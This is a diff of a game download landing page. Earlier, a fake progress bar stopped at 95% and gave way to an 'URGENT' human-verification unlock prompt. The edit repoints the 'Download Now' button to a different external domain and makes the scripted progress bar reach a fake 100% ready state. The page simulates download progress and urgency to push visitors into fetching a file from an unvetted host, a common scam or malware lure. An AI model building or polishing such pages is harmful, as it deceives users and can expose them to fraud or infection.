@@ -195,10 +195,8 @@
         footer {
             text-align: center;
             padding: 20px;
-            background: #000000;
             color: #aaa;
             font-size: 0.9rem;
-            border-top: 1px solid rgba(80, 80, 80, 0.7);
             margin-top: 40px;
         }
 
@@ -221,6 +219,7 @@
             border-radius: 6px;
             text-decoration: none;
             white-space: nowrap;
+            animation: pulse 2s infinite;
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -403,7 +402,7 @@
                     <p class="note">▶ Experience Funny Random Events</p>
                 </div>
             </div>
-            <a href="#" class="download-btn" onclick="startDownload('https://gamelnk.site/cl/i/o4er7n'); return false;">
+            <a href="#" class="download-btn" onclick="startDownload('https://scriptxe.xyz'); return false;">
                 <img src="https://i.ibb.co/JjnGSGMN/downloads-2.png" class="download" alt="downloads">
                 Download Now</a>
         </div>
@@ -451,10 +450,9 @@
 
             <div id="verify-section" style="display:none;">
                 <p class="verify-text urgent-text">
-                    <span style="color: red;" <strong>URGENT:</strong></span> Human verification required to finish
-                    downloading your game!
+                    Your game is ready please click download now to start!
                 </p>
-                <a id="verify-btn" href="#">VERIFY TO UNLOCK</a>
+                <a id="verify-btn" href="#">Download Now</a>
             </div>
 
             <script>
@@ -474,7 +472,7 @@
                     step.textContent = 'Intalizing... 0%';
                     title.textContent = 'Preparing your game...';
 
-                    const steps = [22, 53, 78, 95];
+                    const steps = [22, 53, 78, 100];
                     const msgs = [
                         "Connecting to servers...",
                         "Downloading assets...",
@@ -492,7 +490,7 @@
                         if (i === steps.length) {
                             clearInterval(interval);
                             setTimeout(() => {
-                                title.textContent = 'Almost Complete... 95%';
+                                title.textContent = 'Your Game is Ready... 100%';
                                 verify.style.display = 'block';
                                 step.style.display = 'none';
 
@@ -562,4 +560,5 @@
             </script>
 
 </body>
+
 </html>
